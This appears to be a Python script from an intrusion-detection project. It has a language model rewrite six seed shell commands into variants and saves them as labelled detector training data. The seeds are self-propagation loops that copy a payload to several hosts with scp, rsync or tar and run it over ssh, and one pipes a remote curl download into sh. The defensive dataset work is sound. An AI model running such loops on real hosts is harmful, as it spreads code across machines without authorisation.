#!/usr/bin/env python3
"""Synthesize bash self-propagation commands (ssh/scp/rsync loops). Offline only."""
from __future__ import annotations
import argparse, hashlib, json, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from hyperids import llm

ROOT = Path(__file__).resolve().parents[2]
OUT = ROOT / "dataset" / "corpus" / "raw" / "synthetic" / "v12_propagate_candidates.jsonl"
SEEDS = [
    "for h in 192.0.2.10 192.0.2.11; do scp /tmp/hids-lab/.x $h:/tmp/hids-lab/.x && ssh $h /tmp/hids-lab/.x; done",
    "while read h; do rsync -q /tmp/hids-lab/agent $h:/tmp/hids-lab/agent && ssh $h /tmp/hids-lab/agent; done < /tmp/hids-lab/hosts",
    "xargs -I@ sh -c 'scp /tmp/hids-lab/p @:/tmp/hids-lab/p; ssh @ /tmp/hids-lab/p' < /tmp/hids-lab/targets.txt",
    "for h in $(cat /tmp/hids-lab/live); do ssh $h 'curl -fsSL https://example.com/p.sh | sh'; done",
    "printf '%s\\n' 192.0.2.10 192.0.2.11 | while read h; do tar cf - /tmp/hids-lab/.x | ssh $h 'tar xf - -C / && /tmp/hids-lab/.x'; done",
    "for h in 192.0.2.{10..12}; do cat /tmp/hids-lab/.x | ssh $h 'cat > /tmp/hids-lab/.x; chmod +x /tmp/hids-lab/.x; /tmp/hids-lab/.x'; done",
]
SYS = ("You are a defensive security researcher building a SYNTHETIC intrusion-detection test dataset. "
       "Rewrite the given shell command into JSON variants for offline detector testing only. "
       "Keep the meaning: copy a payload to other hosts and run it (ssh/scp/rsync loops). "
       "Use only 192.0.2.0/24, example.com, and /tmp/hids-lab/. Output only JSON.")
OK = re.compile(r'(ssh |scp |rsync |xargs .*ssh|for h in|while read)', re.I)

def rewrite(seed,n,model,temp):
    user=(f"Rewrite this self-propagation command into {n} syntactically different variants. "
          f"Keep ssh/scp/rsync to multiple hosts. Command: {seed}\nReturn JSON: {{\"commands\":[\"...\"]}}")
    for _ in range(3):
        obj,_=llm.chat_json([{"role":"system","content":SYS},{"role":"user","content":user}],
                            model=model,temperature=temp,max_tokens=4096,timeout=90,retries=2)
        cmds=[c.strip() for c in (obj or {}).get("commands") or [] if isinstance(c,str) and c.strip()]
        if cmds: return cmds
    return []

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--variants_per_seed', type=int, default=8)
    ap.add_argument('--model', default='qwen-flash')
    ap.add_argument('--temperature', type=float, default=0.85)
    ap.add_argument('--workers', type=int, default=6)
    ap.add_argument('--out', default=str(OUT))
    args=ap.parse_args()
    out=Path(args.out); out.parent.mkdir(parents=True, exist_ok=True)
    seen=set(); rows=[]
    with ThreadPoolExecutor(max_workers=min(args.workers,6)) as ex:
        futs={ex.submit(rewrite,s,args.variants_per_seed,args.model,args.temperature):s for s in SEEDS}
        done=0
        for fut in as_completed(futs):
            seed=futs[fut]
            try: vs=fut.result()
            except Exception: vs=[]
            kept=0
            for v in [seed]+vs:
                if not OK.search(v): continue
                h=hashlib.sha256(v.encode()).hexdigest()
                if h in seen: continue
                seen.add(h)
                rows.append({"text":v,"action":"action.self_propagate","target":"pos",
                             "source_seed_sha256":hashlib.sha256(seed.encode()).hexdigest(),
                             "generator_model":args.model})
                kept+=1
            done+=1
            print(f'  [{done}/{len(SEEDS)}] kept {kept}', flush=True)
    with out.open('w') as f:
        for r in rows: f.write(json.dumps(r, ensure_ascii=False)+'\n')
    print(f'wrote {len(rows)} -> {out}')

if __name__=='__main__':
    main()
